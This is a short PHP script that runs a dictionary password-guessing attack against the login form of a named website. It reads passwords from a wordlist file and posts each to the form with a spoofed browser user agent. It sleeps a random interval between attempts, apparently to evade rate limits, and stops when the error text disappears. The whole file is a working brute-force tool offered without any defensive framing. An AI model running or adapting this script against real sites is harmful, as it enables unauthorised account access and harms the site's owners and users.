<?php
/**
 * Created by PhpStorm.
 * User: morontt
 * Date: 20.02.15
 * Time: 0:43
 */

$z = curl_init("http://tizprogrammist.com/login");

curl_setopt($z, CURLOPT_TIMEOUT, 30);
curl_setopt($z, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.01; Windows NT 6.0)');

curl_setopt($z, CURLOPT_POST, true);
curl_setopt($z, CURLOPT_RETURNTRANSFER, true);

function randomSleep()
{
    $p = rand(1, 3);
    sleep($p);
}

$file = realpath(__DIR__) . DIRECTORY_SEPARATOR . 'dict.csv';
if (!file_exists($file)) {
    echo 'Error: dict.csv' . PHP_EOL;
    exit(1);
}
$f = fopen($file, 'r');

while (($buffer = fgets($f)) !== false) {
    $word = trim($buffer);
    $data = 'LoginForm%5Bpassword%5D=' . $word;
    curl_setopt($z, CURLOPT_POSTFIELDS, $data);
    $response = curl_exec($z);
    if (mb_strpos($response, 'Варнинг') !== false) {
        echo $word . " - fail\n";
    } else {
        echo $word . " - success\n";
        break;
    }
    randomSleep();
}

fclose($f);
curl_close($z);
